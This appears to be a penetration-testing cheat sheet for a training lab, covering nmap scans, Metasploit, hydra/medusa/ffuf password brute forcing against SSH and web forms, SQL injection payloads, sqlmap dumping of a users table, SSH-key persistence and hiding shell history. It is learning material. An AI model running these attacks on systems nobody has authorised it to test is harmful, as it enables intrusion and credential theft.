# Tools in detail

## nmap

- all in one
	- `nmap 10.0.33.0/24 -T5 -p- -sS -sV -O -Pn`
- scanning multiple IP blocks
	- `nmap 10.0.33.0/24 10.0.66.0/24 -T5`
- scanning running software and version numbers
	- `nmap 10.0.33.0/24 -p- -sV -sS -Pn`
- scanning OS on host
	- `nmap 10.0.33.0/24 -p- -O`
- resolve hostnames
	- `host 10.0.33.50`
- HTTPS certificate info
	- `nmap -sC -A web.org2`
- discover publicly accessible directories at web servers
	- `nmap --script=http-enum web.org1 web.org2`
	- `dirb https://web.org2`
- main arguments
	- `10.0.33.0/24` target subnet to scan
	- `-T` is the timing speed of the scan
	- `-p-` scan all ports
	- `-sS` include TCP SYN scan
	- `-sV` application version scan
	- `-O` OS detection
	- `-Pn` skip ping test and just discover every target host provided (not neccessary after discovering the hosts for the first time)
	- `--script=vuln` scan for vulnerabilities
- other arguments
	- `-sU` include UDP scan (don't use - extremely slow)
	- `-A` enable OS detection, script scannning, traceroute
	- `-sC` default scripts scan (intrusive!)
	- `--script ssl-cert` specific script scan
	- `-F` scan only the 100 most common ports in each protocol
	- `-oG output.txt` grepable output to file
	- `-v`, `-vv` increase verbosity and print out more info

## linpeas

- shows potential vulnerabilities on host

```sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
```

## dirb

- scan web content

```sh
dirb https://web.org2
```

## Metasploit
- run console
	- `msfconsole`
- arguments
	- `?`, `help`
	- `search`
	- `info`
	- `use`
	- `set RHOST 10.0.33.100`
	- `run`
	- `show options`
	- `exploit -j` for creating session
- install metasploit on jumphost

```sh
sudo apt install -y gpg && \
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

## medusa

```sh
medusa -t 4 -b -h <HOST> -u <USERNAME> -P <WORDLIST> -M ssh
```

## hydra

- wordlist guessing
```sh
hydra -l <USERNAME> -P <WORDLIST> ssh:<HOST>
```

- web forms guessing
```sh
hydra -l admin -P wordlist.txt 'http-get-form://10.0.0.10:80/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect'
```

- brute forcing an access key
```sh
hydra -t 1 -f -l something -P wordlist.txt "http-post-form://10.0.44.55:80/customers/restricted_access.php:access_key=^PASS^:H=Cookie: PHPSESSID=$PHPSESSID:F=Access Denied"
```

## john 

```sh
john --format=<FORMAT> <PASSWORD-HASHES>
```

### wfuzz

```sh
wfuzz -z file,wordlist.txt 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login'
```
- filter out incorrect responses
	- `--hs 'Username and/or password incorrect'` 
- filter out successful responses
	- `--ss "Welcome to the password protected area"`

### ffuf

```sh
ffuf -w wordlist.txt -u 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login' -fr 'Username and/or password incorrect'
```
- arguments
	- `-fr` excludes the responses matching the regex
	- `-mr` for successful message

## SQL injection

- get all (applicable when there is a WHERE clause)
```txt
' OR 1=1 #
```
- return other data
```txt
UNION SELECT user, password FROM users #
```

## sqlmap

- check if target is vulnerable
```sh
sqlmap -u 'http://10.0.0.10:80/vulnerabilities/sqli/?id=1&Submit=Submit'
```

- list all tables in db
```sh
sqlmap -u 'http://10.0.44.55/customers/home.php?user=1' --cookie="PHPSESSID=$PHPSESSID" --batch -D sqlitraining --tables
```

- dump all data from table
```sh
sqlmap -u 'http://10.0.44.55/customers/home.php?user=1' --cookie="PHPSESSID=$PHPSESSID" --batch -D sqlitraining -T users --dump
```

- run SQL command
```sh
sqlmap -u 'http://10.0.44.55/customers/home.php?user=1' --cookie="PHPSESSID=$PHPSESSID" --batch --sql-query 'VERSION()'
```

## lynx

- allows you to view HTML in terminal as text
```sh
curl $URL | lynx -nolist -dump -stdin
```

## ssh keys

- generate new ssh key pair
```sh
ssh-keygen -t ed25519 -C "email@example.com"
```
- copy over to target host
```sh
~/.ssh/authorized_keys
```

## shell commands

- list all users on the host that have login shells
```sh
grep /bin/bash /etc/passwd
```

- ignore history
```sh
HISTCONTROL=ignorespace
```

- filter out strings by length
```sh
awk 'length($0) == 10' /usr/share/wordlists/sqlmap.txt > wordlist.txt
```

- compute hash of password
```sh
echo -n 'u7Lp#Kz9#Jh=82Qr' | md5sum
```

- cat multiline string to file
```sh
cat << 'EOF' > info.php
<?php phpinfo(); ?>
EOF
```

- download from google drive
```sh
curl -L "https://drive.usercontent.google.com/uc?id=1b4d0ES3GvMP1ksgxhLZACiu0WraybOd3&authuser=0&export=download" -o countdown.png
```

## python scripts

- generate wordlists

## curl

- `--cookie "key1=val1;key2=val2"` sets cookies
- `-H "Cookie: PHPSESSID=$PHPSESSID"` does the same